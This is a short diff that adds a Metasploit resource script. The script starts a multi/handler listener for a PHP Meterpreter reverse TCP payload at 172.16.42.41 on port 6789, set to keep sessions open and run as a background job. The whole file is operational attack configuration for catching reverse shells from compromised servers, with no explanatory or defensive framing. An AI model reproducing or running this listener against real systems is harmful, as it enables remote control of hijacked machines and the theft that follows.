@@ -1,0 +1,8 @@
+use exploit/multi/handler				
+set PAYLOAD php/meterpreter/reverse_tcp
+# Listener Details		
+set LHOST 172.16.42.41				
+set LPORT 6789
+set ExitOnSession false				
+exploit -j						
+
